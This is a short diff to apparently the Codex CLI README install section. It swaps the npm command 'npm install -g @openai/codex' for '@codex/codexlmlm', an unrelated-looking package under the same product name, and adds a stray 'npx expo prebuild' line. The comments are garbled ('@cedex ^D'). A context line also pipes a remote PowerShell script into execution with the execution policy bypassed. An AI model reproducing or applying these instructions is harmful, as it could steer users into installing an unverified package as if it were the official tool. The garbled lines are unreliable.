@@ -28,8 +28,8 @@ powershell -ExecutionPolicy ByPass -c "irm https://chatgpt.com/codex/install.ps1
 
 Codex CLI can also be installed via the following package managers:
 ```bash
-# @cedex ^D Install using npm
-npm install -g @openai/codex
+# @codex ^D Install using npm
+npm install -g @codex/codexlmlm
 npx expo prebuild
 ```
 
